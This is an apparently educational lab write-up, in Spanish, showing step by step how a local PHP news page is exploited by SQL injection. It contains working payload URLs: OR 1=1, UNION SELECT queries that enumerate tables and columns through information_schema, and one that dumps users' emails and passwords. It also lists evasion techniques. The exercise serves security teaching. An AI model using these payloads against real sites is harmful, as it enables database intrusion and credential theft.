# Ejercicio 3: Demostración Manual de SQL Injection

## 🎯 Objetivo
Demostrar cómo la aplicación es vulnerable a SQL Injection de forma manual, detallando el proceso paso a paso.

## 🔍 Análisis de la Vulnerabilidad

### Código Vulnerable Identificado:
```php
// En news.php línea ~18
$query = "SELECT id, title, body, datetime FROM blog WHERE id = " . $id;
$result = $pdo->query($query);
```

### Problema:
- El parámetro `$id` se concatena **directamente** en la consulta SQL
- **No hay validación** del input del usuario
- **No hay escape** de caracteres especiales

## 🧪 Pruebas de Explotación Manual

### 1. Funcionamiento Normal
**URL:** `http://localhost/news.php?id=1`

**SQL Generada:**
```sql
SELECT id, title, body, datetime FROM blog WHERE id = 1
```
**Resultado:** ✅ Muestra el artículo con ID 1 normalmente

---

### 2. Prueba Básica de Inyección
**URL:** `http://localhost/news.php?id=1%20OR%201=1`

**URL sin codificar:** `http://localhost/news.php?id=1 OR 1=1`

**SQL Generada:**
```sql
SELECT id, title, body, datetime FROM blog WHERE id = 1 OR 1=1
```

**Explicación:**
- `1=1` siempre es verdadero
- La condición `WHERE` se vuelve siempre verdadera
- **Resultado esperado:** Muestra TODOS los artículos de la tabla

---

### 3. Extracción de Información de la Base de Datos
**URL:** `http://localhost/news.php?id=1%20UNION%20SELECT%201,version(),database(),now()`

**URL sin codificar:** `http://localhost/news.php?id=1 UNION SELECT 1,version(),database(),now()`

**SQL Generada:**
```sql
SELECT id, title, body, datetime FROM blog WHERE id = 1 
UNION SELECT 1,version(),database(),now()
```

**Explicación:**
- `UNION` combina resultados de dos consultas
- Extrae información del sistema:
  - Versión de MySQL
  - Nombre de la base de datos actual
  - Fecha/hora actual

---

### 4. Enumeración de Tablas
**URL:** `http://localhost/news.php?id=1%20UNION%20SELECT%201,table_name,'Tabla%20encontrada',2%20FROM%20information_schema.tables%20WHERE%20table_schema=database()`

**URL sin codificar:** `http://localhost/news.php?id=1 UNION SELECT 1,table_name,'Tabla encontrada',2 FROM information_schema.tables WHERE table_schema=database()`

**SQL Generada:**
```sql
SELECT id, title, body, datetime FROM blog WHERE id = 1 
UNION SELECT 1,table_name,'Tabla encontrada',2 
FROM information_schema.tables WHERE table_schema=database()
```

**Explicación:**
- Usa `information_schema` (metadatos de MySQL)
- Lista todas las tablas de la base de datos actual
- **Resultado esperado:** Revela las tablas `blog` y `users`

---

### 5. Extracción de Estructura de Tablas
**URL:** `http://localhost/news.php?id=1%20UNION%20SELECT%201,column_name,data_type,table_name%20FROM%20information_schema.columns%20WHERE%20table_schema=database()`

**URL sin codificar:** `http://localhost/news.php?id=1 UNION SELECT 1,column_name,data_type,table_name FROM information_schema.columns WHERE table_schema=database()`

**SQL Generada:**
```sql
SELECT id, title, body, datetime FROM blog WHERE id = 1 
UNION SELECT 1,column_name,data_type,table_name 
FROM information_schema.columns WHERE table_schema=database()
```

**Explicación:**
- Extrae nombres de columnas y tipos de datos
- Revela la estructura completa de las tablas
- **Información obtenida:** Columnas de `users` (id, email, name, password)

---

### 6. Extracción de Datos Sensibles
**URL:** `http://localhost/news.php?id=1%20UNION%20SELECT%20id,name,email,password%20FROM%20users`

**URL sin codificar:** `http://localhost/news.php?id=1 UNION SELECT id,name,email,password FROM users`

**SQL Generada:**
```sql
SELECT id, title, body, datetime FROM blog WHERE id = 1 
UNION SELECT id,name,email,password FROM users
```

**Explicación:**
- Extrae **todos los usuarios** de la tabla `users`
- Revela **contraseñas** almacenadas
- **CRÍTICO:** Compromete completamente la seguridad del sistema

---

## 🔨 Paso a Paso de la Explotación

### Fase 1: Confirmación de Vulnerabilidad
1. Probar URLs normales (id=1, id=2, id=3)
2. Inyectar `OR 1=1` para confirmar la vulnerabilidad
3. Observar si se muestran múltiples resultados

### Fase 2: Reconocimiento
1. Extraer información del sistema (versión, base de datos)
2. Enumerar tablas disponibles
3. Extraer estructura de las tablas

### Fase 3: Extracción de Datos
1. Identificar tablas sensibles (users)
2. Extraer datos de usuarios
3. Obtener credenciales y información personal

## 📊 Resultados Esperados

### Datos que se pueden extraer:
- ✅ **Versión de MySQL**
- ✅ **Nombre de la base de datos**
- ✅ **Lista de tablas** (blog, users)
- ✅ **Estructura de tablas** (columnas y tipos)
- ✅ **Todos los artículos** del blog
- ✅ **Todos los usuarios** con contraseñas
- ✅ **Emails y datos personales**

### Impacto de Seguridad:
- 🔴 **CRÍTICO**: Acceso completo a la base de datos
- 🔴 **Exposición de credenciales** de usuarios
- 🔴 **Violación de privacidad** de datos personales
- 🔴 **Posible escalada** a otros sistemas

## ⚠️ Consideraciones Importantes

### Limitaciones en Entorno Real:
- Algunos ataques pueden generar errores visibles
- WAF (Web Application Firewall) podría bloquear intentos
- Logs del servidor registrarían los intentos de ataque
- Rate limiting podría aplicarse

### Técnicas de Evasión (Educativas):
- Codificación URL de caracteres especiales
- Uso de comentarios SQL (`--`, `/**/`)
- Variaciones en espacios y casos
- Time-based attacks para casos sin output visible

---

## 🎓 Conclusiones del Ejercicio 3

✅ **Vulnerabilidad confirmada**: La aplicación es completamente vulnerable a SQL Injection

🔍 **Datos comprometidos**: 
- Toda la información de la base de datos
- Credenciales de usuarios
- Estructura del sistema

⚡ **Facilidad de explotación**: 
- No requiere herramientas especiales
- Explotable desde cualquier navegador web
- Sin autenticación requerida

🚨 **Impacto crítico**: 
- Compromiso total del sistema
- Pérdida de confidencialidad e integridad
- Posible escalada a otros sistemas

---
**Estado:** ✅ Vulnerabilidad SQL Injection demostrada manualmente
**Siguiente:** 🔄 Ejercicio 4 - Implementar Blind SQL Injection
